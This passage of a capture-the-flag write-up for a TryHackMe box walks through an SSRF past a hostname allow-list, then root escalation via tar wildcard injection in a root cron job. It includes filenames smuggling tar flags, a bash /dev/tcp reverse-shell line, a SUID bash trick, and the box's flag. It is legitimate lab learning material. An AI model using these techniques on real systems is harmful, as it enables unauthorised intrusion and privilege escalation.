## Shell as webdev

The web-server purpose is to take a user-given URL and return its contents without the user having to visit the URL themselves. However, no URLs that I tried worked. I tried doing some enumeration and brute-forcing here, but found nothing interesting. So I went back to the source-code that I pulled from the FTP-server. The file `app.py` contained two interesting snippets:

```python
# Only requests targeting an approved internal hostname are forwarded.
# Internal hostname resolves to 127.0.0.1 via /etc/hosts on this box.
ALLOWED_HOSTS = {"kestrel.thm"}
```

```python
# VULN: hostname allow-list is the only check. No scheme check, no path check,
# no localhost-rebind protection - the SSRF is still abusable, but only
# against the allowed hostname.
host = (urlparse(target).hostname or "").lower()
if host not in ALLOWED_HOSTS:
    return page("Preview Blocked",
                '<div class="card"><p>Host not in the approved internal allow-list.</p></div>'), 403

try:
    r = requests.get(target, timeout=3)
    safe_target = html.escape(target)
    safe_body = r.text.replace("<", "&lt;")
    body = f"""
    <div class="card">
        <h2>Preview of {safe_target}</h2>
        <pre>{safe_body}</pre>
    </div>
    """
    return page("Preview", body)
except Exception as e:
    safe_err = html.escape(str(e))
    return page("Preview Failed",
                f'<div class="card"><p>Fetch failed: {safe_err}</p></div>'), 502

@app.route("/admin/")
@app.route("/admin/<path:p>")
def admin(p="index"):
    if not request.remote_addr.startswith("127."):
        abort(403)
    if p == "notes":
        with open("/opt/voltlabs-preview/admin_notes.txt") as f:
            return "<pre>" + f.read() + "</pre>"
    return "<pre>Volt Labs admin endpoint.</pre>"

```

This looks like a standard SSRF vulnerability: 

1. We found the list of allowed hosts, i.e. `kestrel.thm`, and this resolves to 127.0.0.1 on the vulnerable server.
2. The only check is conducted against the hostname.
3. If we give the server the host `kestrel.thm/admin/notes`, it will thus resolve to `127.0.0.1/admin/notes`, and on the web-server this points to the file `/opt/voltlabs-preview/admin_notes.txt`, which sounds promising.

## Escalating to root

Now it took me some time, but eventually I found a cronjob in `/etc/cron.d` that looked promising:

```console
webdev@coldstart:/etc/cron.d$ cat voltlabs-backup 
# Volt Labs staging backup - runs as root
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

* * * * * root cd /opt/backups && tar czf /var/backups/uploads.tgz *
```

This job does the following once per minute:

1. Changes into `/opt/backups`.
2. Creates or overwrites `/var/backups/uploads.tgz`.
3. Compresses **all** non-hidden files and directories in `/opt/backups` into that archive.

So if we could smuggle a malicious command, such as a reverse shell, into `/opt/backups` that somehow gets executed by `tar`, then we'd be done. I tried using the tar-privesc exploit on GTFOBins but could not get it working. I was missing a few flags that tar reads, and found them only after reading a write-up. The gist is this, taken from [https://0xb0b.gitbook.io/writeups/tryhackme/2026/operation-coldstart#recon](https://0xb0b.gitbook.io/writeups/tryhackme/2026/operation-coldstart#recon):

> When root's cron runs `tar czf out.tgz *` in a directory you can write to, the shell expands `*` to whatever filenames exist there. So files named `--checkpoint=1` and `--checkpoint-action=exec=sh shell.sh` get passed to tar as actual command-line flags. Tar's `--checkpoint-action=exec=`  runs a shell command at each checkpoint, so it executes `shell.sh` as root. 

So I only had to add these two "flag-files" and then a script `shell.sh` containing the malicious payload. To this end, I tried a reverse-shell, but this did not spawn a shell in the listener (and I don't know why not):

```console
webdev@coldstart:/opt/backups$ cat shell.sh 
bash -i >& /dev/tcp/192.168.162.43/9001 0>&1
```

Instead, following once more the write-up, I used the trick of copying the `/bin/bash` binary to `/tmp` and then setting the SUID-bit, i.e. I had:

```console
webdev@coldstart:/etc/cron.d$ cd /opt/backups/
webdev@coldstart:/opt/backups$ ls
'--checkpoint-action=exec=sh shell.sh'  '--checkpoint=1'   shell.sh
webdev@coldstart:/opt/backups$ cat shell.sh 
cp /bin/bash /tmp/bash && chmod +s /tmp/bash
```

I don't think I even had to `chmod +x shell.sh`, and after less than a minute, the binary was copied to the `/tmp` directory and could be executed as using `/tmp/bash -p` (`-p` runs the binary in privileged mode, i.e. it does not drop the SUID-bit): 

```console
webdev@coldstart:/opt/backups$ /tmp/bash -p
bash-5.2# id
uid=1001(webdev) gid=1001(webdev) euid=0(root) egid=0(root) groups=0(root),1001(webdev)
bash-5.2# cat /root/flag.txt
THM{e6ee84a483d67ade06936fcfd1433e8a}
```
